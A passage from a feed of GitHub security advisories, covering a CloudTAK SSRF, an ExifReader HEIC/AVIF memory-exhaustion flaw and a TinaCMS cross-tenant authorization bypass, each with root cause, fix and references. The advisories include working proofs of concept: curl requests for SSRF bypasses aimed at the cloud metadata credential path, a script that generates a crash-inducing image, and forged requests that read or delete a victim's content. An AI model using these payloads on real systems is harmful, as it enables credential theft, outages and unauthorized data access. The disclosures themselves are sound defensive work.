<li>Handler <code>api/routes/basemap.ts</code> L155–L233 calls <code>Auth.is_auth(config, req)</code> (L157, any authenticated user passes) then <code>importBasemapURL(config, (req.body).url, (req.body).auth)</code> (L233).</li>
<li><code>importBasemapURL</code> (L68) does <code>new URL(rawURL)</code> (L79) and, for non-ESRI URLs, reaches <code>const tjres = await fetch(url)</code> (L99) — the SSRF sink. No host/IP classification occurs anywhere on this path; <code>fetch</code> uses the default <code>redirect: 'follow'</code>.</li>
<li>The response JSON is parsed (L104) and <code>name</code> / <code>attribution</code> / <code>tiles[0]</code> are copied into the response object (L106–L117) and returned to the attacker — closing the read loop.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Server-side full-read SSRF from the network position of the CloudTAK API server, reachable by any single authenticated user:</p>
<ul>
<li>Read the cloud instance metadata endpoint (<code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>) and exfiltrate temporary IAM credentials.</li>
<li>Reach and read internal-only HTTP services (databases' HTTP UIs, admin panels, other microservices) not exposed to the internet.</li>
<li>Enumerate internal hosts/ports via response/timing differences.</li>
</ul>
<p>Because the fetched body is reflected back to the caller, the attack is non-blind (full response disclosure), not merely a blind request-forgery.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>End-to-end reproduction against a <strong>real deployed CloudTAK API server</strong> (not a unit harness). An internal-only sentinel HTTP service is bound to <code>127.0.0.1:9000</code> (loopback only, unreachable from outside the host) and returns a TileJSON body carrying secret marker values; the proof is that the CloudTAK server fetches it server-side and reflects those secrets back to the attacker.</p>
<ol>
<li>Pinned install / build (v13.5.0, commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>):</li>
</ol>
<pre><code class="language-bash">git clone https://github.com/dfpc-coe/CloudTAK.git
cd CloudTAK &amp;&amp; git checkout v13.5.0
cd api &amp;&amp; npm ci
# Postgres reachable at postgres://postgres@localhost:5432/tak_ps_etl (PostGIS-enabled)
</code></pre>
<ol start="2">
<li>Deploy the real API server (test stack: SigningSecret defaults to the hardcoded <code>coe-wildland-fire</code>, migrations auto-apply, a default server row is auto-generated):</li>
</ol>
<pre><code class="language-bash">cd api
StackName=test \
SigningSecret=coe-wildland-fire \
POSTGRES='postgres://postgres@localhost:5432/tak_ps_etl' \
API_URL='http://localhost:5001' \
npx tsx index.ts --noevents --nosinks --nogeofence
# =&gt; "ok - http://localhost:5001"
</code></pre>
<ol start="3">
<li>Internal-only sentinel (<code>internal_sentinel.js</code>) — simulates an internal HTTP service / metadata endpoint, bound to loopback only:</li>
</ol>
<pre><code class="language-js">const http = require('http');
const fs = require('fs');
const srv = http.createServer((req, res) =&gt; {
  fs.appendFileSync('/tmp/ssrf_sentinel_hits.log',
    `[HIT ${new Date().toISOString()}] ${req.method} ${req.url} from=${req.socket.remoteAddress}\n`);
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({
    name: 'INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c',
    attribution: 'leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e',
    tiles: ['http://127.0.0.1:9000/internal/{z}/{x}/{y}.png'],
    minzoom: 0, maxzoom: 19
  }));
});
srv.listen(9000, '127.0.0.1', () =&gt; console.log('sentinel on 127.0.0.1:9000 (internal-only)'));
</code></pre>
<pre><code class="language-bash">node internal_sentinel.js &amp;
# A redirector for the redirect-follow variant, also loopback-only:
node -e "require('http').createServer((q,r)=&gt;{r.writeHead(302,{Location:'http://127.0.0.1:9000/via-302-redirect'});r.end();}).listen(9100,'127.0.0.1')" &amp;
</code></pre>
<ol start="4">
<li>Attacker driver — mint a normal user JWT (signed with the deployed <code>SigningSecret</code>) and issue the three requests:</li>
</ol>
<pre><code class="language-bash">TOK=$(node -e "console.log(require('jsonwebtoken').sign({email:'attacker@evil.test',access:'user'},'coe-wildland-fire'))")

# (a) loopback / metadata-style path
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/"}'

# (b) decimal-IP encoding of 127.0.0.1
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://2130706433:9000/decimal-ip-bypass"}'

# (c) public-looking host that 302-redirects to internal (redirect:follow)
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9100/start"}'
</code></pre>
<ol start="5">
<li>Captured output — all three return the internal sentinel's secret body to the attacker, and the loopback-only sentinel records the server-side hits:</li>
</ol>
<pre><code># HTTP response body returned to the attacker for (a), (b) and (c):
{"type":"raster","name":"INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c",
 "attribution":"leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e",
 "maxzoom":19,"minzoom":0,"url":"http://127.0.0.1:9000/internal/{$z}/{$x}/{$y}.png","format":"png"}

# /tmp/ssrf_sentinel_hits.log (sentinel is bound to 127.0.0.1 only):
[HIT 2026-06-03T05:01:13.606Z] GET /latest/meta-data/iam/security-credentials/ from=127.0.0.1
[HIT 2026-06-03T05:01:29.099Z] GET /decimal-ip-bypass from=127.0.0.1
[HIT 2026-06-03T05:01:30.151Z] GET /via-302-redirect from=127.0.0.1
</code></pre>
<p>The <code>name</code> and <code>attribution</code> values returned to the attacker are read verbatim from the internal service's HTTP response, demonstrating full-read SSRF. In a real cloud deployment the equivalent request <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> returns instance-role credentials.</p>
<ol start="6">
<li>Negative control — a public host is fetched normally (the endpoint is not globally broken); only the <em>reachability</em> of internal addresses is the defect.</li>
</ol>
<h3 id="end-to-end-reproduction-against-pinned-version">End-to-end reproduction (against pinned version)</h3>
<p>All of the above was executed against a real deployed CloudTAK API server built from tag <code>v13.5.0</code> (commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>), booted with <code>StackName=test</code> against a PostGIS-enabled Postgres so migrations and routes load unmodified. The vulnerable build returned the internal sentinel's secret body (<code>INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c</code>, <code>leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e</code>) for all three bypass variants, and the loopback-only sentinel recorded the three server-side hits shown above.</p>
<p>After applying the fix below to the same deployed build and restarting, the exact same three attacker requests instead return:</p>
<pre><code>{"status":403,"message":"URL resolves to a disallowed (internal) address","messages":[]}
</code></pre>
<p>and the sentinel log records <strong>no</strong> new hits, while <code>https://example.com/tile.json</code> continues to be fetched (returns <code>400 "Unable to fetch TileJSON"</code> — it reached the public host, the body just is not valid TileJSON). An <code>isBlockedIP</code> unit check passes 14/14: <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>100.64/10</code>, <code>::1</code>, <code>::ffff:127.0.0.1</code>, <code>fd00::/8</code>, <code>fe80::/10</code>, <code>64:ff9b::/96</code> all blocked; <code>8.8.8.8</code>, <code>1.1.1.1</code>, <code>93.184.216.34</code> all allowed.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Add an SSRF guard that (1) resolves the target hostname via DNS and rejects the request if <strong>any</strong> resolved address falls in a loopback / private / link-local (incl. <code>169.254.0.0/16</code> cloud metadata) / CGNAT / IPv6-ULA / IPv4-mapped / NAT64 range, and (2) follows redirects manually, re-validating the <code>Location</code> of every hop so a 302 to an internal address cannot bypass the check. Apply it to the import sink at <code>api/routes/basemap.ts</code> (the <code>fetch(url)</code> call) and to the ESRI/metadata fetch paths in the same file.</p>
<p>A self-contained <code>safeFetch(url)</code> helper (DNS resolution + per-hop re-validation) replacing the bare <code>fetch(url)</code> is sufficient; the same helper should back the other user-URL fetches in the basemap routes. A fix PR implementing exactly this guard is provided.</p>
<p>Note: a literal-string/prefix host blocklist (e.g. matching <code>127.</code>, <code>10.</code>, <code>192.168.</code>) is <strong>not</strong> sufficient — it is bypassed by alternate IP encodings, IPv6-mapped forms, and DNS-rebinding hostnames. The guard must classify the <strong>resolved</strong> numeric address.</p>
<h3 id="severity">Severity</h3>
<p>High. Pre-conditions: a single authenticated CloudTAK user account (any role). Impact: server-side full-read access to internal-only HTTP services and the cloud metadata endpoint from the API server's network position, enabling theft of instance credentials and internal reconnaissance. No additional privileges or victim interaction required.</p>
<h3 id="fix-pr-link">Fix PR link</h3>
<p>A fix PR implementing the DNS-resolving, redirect-re-validating <code>safeFetch</code> guard described above is provided to the maintainers via the private temporary fork associated with this advisory. The full guard source is also inlined under the Suggested fix section's reasoning above; the patch adds <code>api/lib/ssrf-guard.ts</code> and replaces the bare <code>fetch(url)</code> at <code>api/routes/basemap.ts</code> with <code>safeFetch(url)</code>.</p>
<h3 id="credits">Credits</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v">https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v</a></li>
<li><a href="https://github.com/dfpc-coe/CloudTAK/pull/1513">https://github.com/dfpc-coe/CloudTAK/pull/1513</a></li>
<li><a href="https://github.com/dfpc-coe/CloudTAK/commit/1e0f6e65977c86fbc0aa15e308c43cbcaee23a7c">https://github.com/dfpc-coe/CloudTAK/commit/1e0f6e65977c86fbc0aa15e308c43cbcaee23a7c</a></li>
<li><a href="https://github.com/dfpc-coe/CloudTAK/commit/556b35632877802c7e9c818db44aef7a2c3abebf">https://github.com/dfpc-coe/CloudTAK/commit/556b35632877802c7e9c818db44aef7a2c3abebf</a></li>
<li><a href="https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.22.1">https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vqrw-qphh-p34v">https://github.com/advisories/GHSA-vqrw-qphh-p34v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqrw-qphh-p34v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-17T19:02:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[exifreader] ExifReader: DoS via Crafted HEIC/AVIF iloc Box - Memory Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-pj96-35fp-cfcc</id>
        <link href="https://github.com/advisories/GHSA-pj96-35fp-cfcc"/>
        <updated>2026-09-17T16:30:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ExifReader 4.41.0 is vulnerable to denial of service through a crafted HEIC or AVIF file with a malicious <code>iloc</code> box. When <code>offsetSize</code>, <code>lengthSize</code>, and <code>baseOffsetSize</code> are set to zero in the iloc header, the extent-parsing loop allocates an unbounded number of JavaScript objects - up to <code>itemCount × extentCount</code> (65535 × 65535 = 4.3 billion) - without advancing the buffer offset. A 652-byte file causes 400MB of heap growth; a 6KB file exhausts all system memory and crashes the Node.js process with a JavaScript heap out-of-memory error.</p>
<h2 id="affected-version-tested">Affected version tested</h2>
<ul>
<li>npm package: <code>exifreader</code></li>
<li>Version: <code>4.41.0</code></li>
<li>Affected formats: HEIC, AVIF (ISO-BMFF container)</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p><strong>File:</strong> <code>src/image-header-iso-bmff-iloc.js</code>, lines 79–116, function <code>getItems()</code>.</p>
<p>The iloc parser reads four size fields from the file (each a 4-bit nibble, valid values 0–15):</p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Controls</th>
</tr>
</thead>
<tbody><tr>
<td><code>offsetSize</code></td>
<td>Bytes per extent offset</td>
</tr>
<tr>
<td><code>lengthSize</code></td>
<td>Bytes per extent length</td>
</tr>
<tr>
<td><code>baseOffsetSize</code></td>
<td>Bytes per item base offset</td>
</tr>
<tr>
<td><code>indexSize</code></td>
<td>Bytes per extent index</td>
</tr>
</tbody></table>
<p>The code then enters a nested loop: for each item (up to 65535), and for each extent within that item (up to 65535), it reads variable-width fields and advances the buffer offset by the corresponding size:</p>
<pre><code class="language-javascript">for (let j = 0; j &lt; item.extentCount; j++) {
    const extent = {};
    extent.extentIndex = getExtentIndex(dataView, version, offset, indexSize);
    offset += sizes.item.extent.extentIndex;       // 0 when indexSize=0
    extent.extentOffset = getVariableSizedValue(dataView, offset, offsetSize);
    offset += sizes.item.extent.extentOffset;       // 0 when offsetSize=0
    extent.extentLength = getVariableSizedValue(dataView, offset, lengthSize);
    offset += sizes.item.extent.extentLength;       // 0 when lengthSize=0
    item.extents.push(extent);                      // allocates unconditionally
}
</code></pre>
<p>When all four size fields are zero (a valid value per the ISO-BMFF specification, meaning "field not present"), the buffer offset never advances inside the inner loop. Yet every iteration still pushes a new extensible object onto <code>item.extents</code>. There is no iteration cap, no cumulative allocation budget, and no guard that skips the inner loop when all sizes are zero.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Save the following as <code>poc_iloc_dos.js</code> and run with Node.js against the bundled <code>dist/exif-reader.js</code>:</p>
<pre><code class="language-javascript">const fs = require('fs');
const ExifReader = require('../ExifReader-4.41.0/dist/exif-reader.js');

function u32be(n) {
    return [(n &gt;&gt;&gt; 24) &amp; 255, (n &gt;&gt;&gt; 16) &amp; 255, (n &gt;&gt;&gt; 8) &amp; 255, n &amp; 255];
}
function u16be(n) {
    return [(n &gt;&gt;&gt; 8) &amp; 255, n &amp; 255];
}
function str(s) {
    return Array.from(Buffer.from(s, 'ascii'));
}
function box(type, content) {
    return [...u32be(8 + content.length), ...str(type), ...content];
}

const ITEMS = 10000;
const EXTENTS = 65535;

const ftyp = box('ftyp', [
    ...str('heic'),
    ...u32be(0),
    ...str('mif1'),
    0, 0, 0, 0,
]);

const ilocPayload = [
    0, 0, 0, 0,
    0, 0,
    ...u16be(ITEMS),
];

for (let i = 0; i &lt; ITEMS; i++) {
    ilocPayload.push(...u16be(i + 1));
    ilocPayload.push(...u16be(0));
    ilocPayload.push(...u16be(EXTENTS));
}

const iloc = box('iloc', ilocPayload);
const meta = box('meta', [0, 0, 0, 0, ...iloc]);
const data = Uint8Array.from([...ftyp, ...meta]);

fs.writeFileSync('/tmp/poc_iloc_dos.heic', data);

console.log(`${data.length} bytes | ${ITEMS} items x ${EXTENTS} extents | ~${((ITEMS * EXTENTS * 80) / (1024 ** 3)).toFixed(0)} GB expected`);

const start = Date.now();
const timeout = setTimeout(() =&gt; {
    console.log(`[DoS CONFIRMED] Hung after ${((Date.now() - start) / 1000).toFixed(1)}s`);
    process.exit(1);
}, 30000);

try {
    ExifReader.load(data.buffer);
    clearTimeout(timeout);
    console.log(`Parse completed in ${((Date.now() - start) / 1000).toFixed(1)}s`);
} catch (e) {
    clearTimeout(timeout);
    console.log(`Error: ${e.message}`);
}
</code></pre>
<h3 id="scaled-test-results">Scaled test results</h3>
<p>Run the above with different ITEMS values:</p>
<table>
<thead>
<tr>
<th>Items</th>
<th>File size</th>
<th>Extent objects</th>
<th>Parse time</th>
<th>Heap growth</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>58 bytes</td>
<td>65,535</td>
<td>0.03s</td>
<td>+4 MB</td>
</tr>
<tr>
<td>5</td>
<td>82 bytes</td>
<td>327,675</td>
<td>0.17s</td>
<td>+16 MB</td>
</tr>
<tr>
<td>100</td>
<td>652 bytes</td>
<td>6,553,500</td>
<td>1.74s</td>
<td>+401 MB</td>
</tr>
<tr>
<td>256</td>
<td>1,588 bytes</td>
<td>16,776,960</td>
<td>~8s</td>
<td>OOM crash</td>
</tr>
<tr>
<td>10000</td>
<td>60,052 bytes</td>
<td>655,350,000</td>
<td>-</td>
<td>OOM crash (4 GB+)</td>
</tr>
<tr>
<td><img width="1839" height="588" alt="image" src="https://github.com/user-attachments/assets/cc3bd540-4197-4ada-93c9-3397811a6c02"></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="expected-behavior">Expected behavior</h2>
<p>A zero-size field is valid per the ISO-BMFF spec (it means the field is not present). The parser should either:</p>
<ol>
<li>Skip the inner extent loop when all extent field sizes are zero and no items need extent data, or</li>
<li>Cap the number of extent objects allocated (e.g., a per-item or cumulative budget).</li>
</ol>
<h2 id="security-impact">Security impact</h2>
<p>This is a denial-of-service vulnerability. An unauthenticated attacker can craft a ~1 KB HEIC/AVIF image that, when parsed by ExifReader, causes a JavaScript heap out-of-memory crash, aborting the application process. Any web service, desktop application, or mobile app that processes user-uploaded HEIC/AVIF images through ExifReader is affected.</p>
<p><strong>Note:</strong> The impact is established using ExifReader's existing distributed (<code>dist/exif-reader.js</code>) code.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>In <code>src/image-header-iso-bmff-iloc.js</code>, in the <code>getItems()</code> function, add a maximum per-item extent limit:</p>
<pre><code class="language-javascript">const MAX_EXTENTS_PER_ITEM = 10000;

for (let j = 0; j &lt; item.extentCount; j++) {
    if (item.extents.length &gt;= MAX_EXTENTS_PER_ITEM) {
        break;
    }
    // ... existing code ...
}
</code></pre>
<p>Alternatively (or additionally), skip the inner loop when all extent field sizes are zero:</p>
<pre><code class="language-javascript">if (sizes.item.extent.extentOffset === 0 &amp;&amp; sizes.item.extent.extentLength === 0) {
    // Fields are absent per spec; nothing meaningful to read
    // Still advance offset if extentCount &gt; 0 to maintain correctness
    continue;
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mattiasw/ExifReader/security/advisories/GHSA-pj96-35fp-cfcc">https://github.com/mattiasw/ExifReader/security/advisories/GHSA-pj96-35fp-cfcc</a></li>
<li><a href="https://github.com/mattiasw/ExifReader/commit/17b901cd192d2c90d7f9f347bd3073b28b482699">https://github.com/mattiasw/ExifReader/commit/17b901cd192d2c90d7f9f347bd3073b28b482699</a></li>
<li><a href="https://github.com/mattiasw/ExifReader/releases/tag/v4.41.1">https://github.com/mattiasw/ExifReader/releases/tag/v4.41.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pj96-35fp-cfcc">https://github.com/advisories/GHSA-pj96-35fp-cfcc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pj96-35fp-cfcc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T16:30:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-tinacms-azure] Tina: [Broken Access Control] letting any TinaCloud user authorize against any self-hosted site]]></title>
        <id>https://github.com/advisories/GHSA-g74q-6g2f-874x</id>
        <link href="https://github.com/advisories/GHSA-g74q-6g2f-874x"/>
        <updated>2026-09-17T14:59:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>@tinacms/auth</code>'s <code>isAuthorized(req)</code> decides authorization by validating the caller's bearer token against <code>https://identity.tinajs.io/v2/apps/${req.query.clientID}/currentUser</code>, where the <code>clientID</code> comes from the request and is never compared to the site's own configured TinaCloud app id. The function answers "is this token a verified user of whatever app the caller named?" instead of "is this token a verified user of THIS site?"</p>
<p>Any TinaCloud user can create their own free app, get a valid token for it, and send <code>?clientID=&lt;their-own-app&gt;</code> plus <code>Authorization: &lt;their-own-token&gt;</code> to a victim self-hosted site. The victim's <code>authorized</code> callback runs <code>const user = await isAuthorized(req); return user &amp;&amp; user.verified</code>, which returns <code>true</code>, and the victim authorizes the attacker.</p>
<p>The attacker holds no account on the victim and needs no victim interaction. With the media handlers this grants read, upload, and delete on the victim's media bucket. When the backend uses <code>TinaCloudBackendAuthProvider()</code> (the default the <code>tinacms init</code> wizard generates for TinaCloud auth), it grants full GraphQL read, write, and delete of the victim's content.</p>
<h2 id="affected-code-confirmed-at-5a6839f">Affected code (confirmed at <code>5a6839f</code>)</h2>
<p><code>packages/@tinacms/auth/src/index.ts:71-88</code> reads the <code>clientID</code> from the request:</p>
<pre><code class="language-ts">export const isAuthorized = async (req: NextApiRequest) =&gt; {
  const clientID = req.query.clientID;     // attacker-controlled
  const token = req.headers.authorization; // attacker-controlled
  if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};
</code></pre>
<p><code>index.ts:16-43</code> sends that caller-chosen <code>clientID</code> straight to the identity server, and returns the user on <code>200</code>:</p>
<pre><code class="language-ts">const tinaCloudRes = await fetch(
  `https://identity.tinajs.io/v2/apps/${clientID}/currentUser`,
  { headers: new Headers({ 'Content-Type': 'application/json', authorization: token }), method: 'GET' }
);
if (tinaCloudRes.ok) { return await tinaCloudRes.json(); }
</code></pre>
<p><code>index.ts:118-135</code> (<code>TinaCloudBackendAuthProvider</code>) gates only on <code>verified</code>, which reflects the attacker's own email verification:</p>
<pre><code class="language-ts">isAuthorized: async (req, _res) =&gt; {
  const user = await isAuthorized(req as NextApiRequest);
  if (user &amp;&amp; user.verified) return { isAuthorized: true };
  return { isAuthorized: false, errorCode: 401, errorMessage: 'Unauthorized' };
},
</code></pre>
<p>Every media-store README wires the same gate (<code>next-tinacms-cloudinary/README.md:113-122</code>, identical in <code>s3</code> and <code>dos</code>):</p>
<pre><code class="language-ts">authorized: async (req, _res) =&gt; {
  if (process.env.NEXT_PUBLIC_USE_LOCAL_CLIENT === '1') return true;
  const user = await isAuthorized(req);
  return user &amp;&amp; user.verified;   // no clientID === &lt;this site's app&gt; check
}
</code></pre>
<p>The bug is duplicated in <code>next-tinacms-azure/src/auth.ts:34-51</code> (<code>req.nextUrl.searchParams.get('clientID')</code>). Downstream nothing pins the site's <code>clientID</code>: <code>@tinacms/datalayer/src/backend/index.ts:201</code> gates on the boolean, and <code>next-tinacms-cloudinary/src/handlers.ts:36</code> returns 401 only when the callback is false. The <code>tinacms init</code> TinaCloud path ships this by default (<code>@tinacms/cli/.../prompts/authProvider.ts:17</code> -&gt; <code>TinaCloudBackendAuthProvider()</code>, used in <code>templates/tinaNextRoute.tsx:21-24</code> for every non-local deployment).</p>
<h2 id="steps-to-reproduce-real-target">Steps to reproduce (real target)</h2>
<p><strong>Setup:</strong> attacker has one free TinaCloud account with one app (<code>clientID = ATTACKER_APP</code>, token <code>T_attacker</code>) and no victim account. Victim is any self-hosted TinaCMS site using <code>@tinacms/auth</code>.</p>
<p>Media bucket (read; the same gate covers <code>POST</code> upload and <code>DELETE</code>):</p>
<pre><code>GET /api/cloudinary/media?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
</code></pre>
<p>Content backend, when <code>TinaCloudBackendAuthProvider</code> is used:</p>
<pre><code>POST /api/tina/gql?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
Content-Type: application/json
 
{"query":"mutation($c:String!,$r:String!){deleteDocument(collection:$c,relativePath:$r){__typename}}","variables":{"c":"post","r":"hello.md"}}
</code></pre>
<p><strong>Expected:</strong> 401/403 for a user with no access to <code>victim.example</code>.
<strong>Actual:</strong> 200, because authorization is bound to the attacker-supplied <code>clientID</code>.</p>
<h2 id="proof-of-concept-self-contained-zero-dependencies">Proof of concept (self-contained, zero dependencies)</h2>
<p>Save the file below as <code>poc.js</code> and run <code>node poc.js</code> (Node &gt;= 18). It runs the package's own <code>isAuthorized</code> / <code>isUserAuthorized</code> (TypeScript types removed; the hard-coded <code>identity.tinajs.io</code> base read from an env var so it points at a local identity model) behind the verbatim media-store <code>authorized</code> callback. The identity model scopes tokens to apps correctly and is not itself vulnerable; the bug is that the victim lets the caller choose which app to validate against.</p>
<pre><code class="language-js">/**
 * Self-contained PoC — @tinacms/auth cross-tenant authorization bypass
 * Audited commit: 5a6839f95ca60d1b9f4032a3bed1ae4a338a4787 (@tinacms/auth 1.1.3)
 *
 * Zero dependencies. Run with:  node poc.js   (Node &gt;= 18 for global fetch)
 *
 * The two functions below are copied from packages/@tinacms/auth/src/index.ts.
 * The ONLY changes are: TypeScript types removed, and the hard-coded
 * https://identity.tinajs.io base read from IDENTITY_BASE so it can point at the
 * local identity model. req.query.clientID, the currentUser call, and the
 * `user &amp;&amp; user.verified` gate are byte-for-byte the original logic.
 */
 
const http = require('http');
 
const IDENTITY_PORT = 18099;
const VICTIM_PORT = 19090;
process.env.IDENTITY_BASE = `http://127.0.0.1:${IDENTITY_PORT}`;
 
/* ===== verbatim from @tinacms/auth/src/index.ts (types stripped) ===== */
 
const isUserAuthorized = async (args) =&gt; {
  const clientID = args.clientID;
  const token = args.token;
  try {
    const tinaCloudRes = await fetch(
      `${process.env.IDENTITY_BASE || 'https://identity.tinajs.io'}/v2/apps/${clientID}/currentUser`,
      {
        headers: new Headers({ 'Content-Type': 'application/json', authorization: token }),
        method: 'GET',
      }
    );
    if (tinaCloudRes.ok) {
      const user = await tinaCloudRes.json();
      return user;
    }
    return;
  } catch (e) {
    console.error(e);
    throw e;
  }
};
 
const isAuthorized = async (req) =&gt; {
  const clientID = req.query.clientID;       // &lt;-- attacker-controlled
  const token = req.headers.authorization;   // &lt;-- attacker-controlled
  if (typeof clientID === 'string' &amp;&amp; typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};
 
/* ===== identity model: a token grants access to the app its owner owns =====
   This is NOT the vulnerable part. It scopes tokens to apps correctly. The bug
   is that the victim lets the caller choose which app to validate against.     */
 
const TOKEN_FOR = {
  'victim-app': 'valid-token-for-victim-app',
  'attacker-app': 'valid-token-for-attacker-app',
};
const USER_FOR = {
  'victim-app': { id: 'u-victim', email: 'owner@victim.example', verified: true, role: 'admin' },
  'attacker-app': { id: 'u-attacker', email: 'attacker@evil.example', verified: true, role: 'admin' },
};
const identity = http.createServer((req, res) =&gt; {
  const m = req.url.match(/^\/v2\/apps\/([^/]+)\/currentUser$/);
  if (!m) { res.writeHead(404); return res.end('nf'); }
  const app = decodeURIComponent(m[1]);
  if (TOKEN_FOR[app] &amp;&amp; req.headers['authorization'] === TOKEN_FOR[app]) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(USER_FOR[app]));
  }
  res.writeHead(401, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ message: 'unauthorized for this app' }));
});
 
/* ===== victim site (own clientID = victim-app), verbatim media-store README callback ===== */
 
const authorized = async (req) =&gt; {
  const user = await isAuthorized(req);
  return user &amp;&amp; user.verified;             // never checks req.query.clientID === victim-app
};
const victim = http.createServer(async (req, res) =&gt; {
  const u = new URL(req.url, `http://127.0.0.1:${VICTIM_PORT}`);
  req.query = Object.fromEntries(u.searchParams.entries());
  if (!u.pathname.startsWith('/api/cloudinary/media')) { res.writeHead(404); return res.end('nf'); }
  if (!(await authorized(req))) {
    res.writeHead(401, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ message: 'sorry this user is unauthorized' }));
  }
  res.writeHead(200, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ authorized: true, site: 'victim-app',
    media: ['victim/private/contract.pdf', 'victim/private/customers.csv'] }));
});
 
/* ===== driver ===== */
 
function call(clientID, token) {
  return new Promise((resolve) =&gt; {
    const r = http.request({ host: '127.0.0.1', port: VICTIM_PORT,
      path: `/api/cloudinary/media?clientID=${encodeURIComponent(clientID)}`,
      method: 'GET', headers: { authorization: token } }, (res) =&gt; {
      let b = ''; res.on('data', (c) =&gt; (b += c));
      res.on('end', () =&gt; resolve({ status: res.statusCode, body: b }));
    });
    r.on('error', (e) =&gt; resolve({ status: 0, body: String(e) })); r.end();
  });
}
 
(async () =&gt; {
  await new Promise((r) =&gt; identity.listen(IDENTITY_PORT, '127.0.0.1', r));
  await new Promise((r) =&gt; victim.listen(VICTIM_PORT, '127.0.0.1', r));
 
  const c1 = await call('victim-app', 'valid-token-for-victim-app');
  console.log('[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   -&gt;', c1.status, c1.body);
 
  const c2 = await call('victim-app', 'valid-token-for-attacker-app');
  console.log('[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker -&gt;', c2.status, c2.body);
 
  const atk = await call('attacker-app', 'valid-token-for-attacker-app');
  console.log('[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker -&gt;', atk.status, atk.body);
 
  const bug = c1.status === 200 &amp;&amp; c2.status === 401 &amp;&amp; atk.status === 200;
  console.log('\nVERDICT:', bug
    ? 'VULNERABLE — attacker authorized on victim site with credentials only for their own app.'
    : 'NOT REPRODUCED');
  identity.close(); victim.close();
  process.exit(bug ? 0 : 1);
})();
</code></pre>
<p>Output:</p>
<pre><code>[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   -&gt; 200 {"authorized":true,"site":"victim-app","media":[...]}
[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker -&gt; 401 {"message":"sorry this user is unauthorized"}
[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker -&gt; 200 {"authorized":true,"site":"victim-app","media":[...]}
 
VERDICT: VULNERABLE - attacker authorized on victim site with credentials only for their own app.
</code></pre>
<p>CONTROL 1 (200) shows the identity model is faithful, not a blanket allow. CONTROL 2 (401) shows the attacker cannot reach the victim's app with their own token. ATTACK (200) shows that naming their own app id, which their own token matches, passes the victim's gate and returns the victim's private media.</p>
